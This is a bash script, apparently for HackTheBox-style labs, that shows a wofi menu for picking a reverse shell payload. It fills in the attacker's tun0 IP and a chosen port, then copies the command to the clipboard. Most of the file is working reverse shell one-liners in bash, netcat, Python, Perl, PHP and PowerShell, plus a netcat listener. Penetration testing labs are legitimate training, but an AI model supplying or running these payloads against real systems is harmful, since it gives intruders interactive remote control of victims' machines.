#!/usr/bin/env bash

# Cryo - reverse shell payload picker
# Basically a quick menu using wofi to pick a reverse shell, automatically populate it
# with the machines tun0 IP address.
# Template is still useful without tun0, as it just has the placeholder "LHOST"

set -e -u
export PATH="$HOME/.local/bin:$PATH"

LHOST=""
if ip -4 addr show tun0 >/dev/null 2>&1; then
  LHOST=$(ip -4 addr show tun0 2>/dev/null |
    grep -oE 'inet [0-9.]+' | head -n1 | cut -d' ' -f2)
fi
if [ -z "$LHOST" ] && [ -f "$HOME/.cache/cryo-htb-vpn" ]; then
  LHOST=$(awk '{for(i=1;i<=NF;i++) if($i ~ /^myip=/){sub(/^myip=/,"",$i); print $i}}' \
    "$HOME/.cache/cryo-htb-vpn")
fi
[ -z "$LHOST" ] && LHOST="<LHOST>"

KIND=$(printf '%s\n' \
  "bash (TCP /dev/tcp)" \
  "bash (mkfifo + nc)" \
  "nc -e (busybox / OpenBSD nc)" \
  "python3" \
  "perl" \
  "php" \
  "powershell" \
  "listener (nc -lvnp)" |
  wofi --dmenu --no-show-icons --prompt="revshell" || true)
[ -z "$KIND" ] && exit 0

LPORT=$(printf '4444\n9001\n8443\n1337\nother…\n' |
  wofi --dmenu --no-show-icons --prompt="port" || true)
[ -z "$LPORT" ] && exit 0
if [ "$LPORT" = "other…" ]; then
  LPORT=$(printf '' | wofi --dmenu --no-show-icons --prompt="port =" || true)
  [ -z "$LPORT" ] && exit 0
fi

case "$KIND" in
"bash (TCP /dev/tcp)")
  P="bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'"
  ;;
"bash (mkfifo + nc)")
  P="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f"
  ;;
"nc -e (busybox / OpenBSD nc)")
  P="nc -e /bin/sh ${LHOST} ${LPORT}"
  ;;
"python3")
  P="python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"${LHOST}\",${LPORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
  ;;
"perl")
  P="perl -e 'use Socket;\$i=\"${LHOST}\";\$p=${LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
  ;;
"php")
  P="php -r '\$sock=fsockopen(\"${LHOST}\",${LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
  ;;
"powershell")
  P="powershell -nop -c \"\$c=New-Object Net.Sockets.TCPClient('${LHOST}',${LPORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$o=(iex \$d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';\$x=([Text.Encoding]::ASCII).GetBytes(\$o);\$s.Write(\$x,0,\$x.Length);\$s.Flush()};\$c.Close()\""
  ;;
"listener (nc -lvnp)")
  P="nc -lvnp ${LPORT}"
  ;;
esac

printf '%s' "$P" | wl-copy
notify-send -t 2500 "revshell copied" "${KIND}  →  ${LHOST}:${LPORT}"
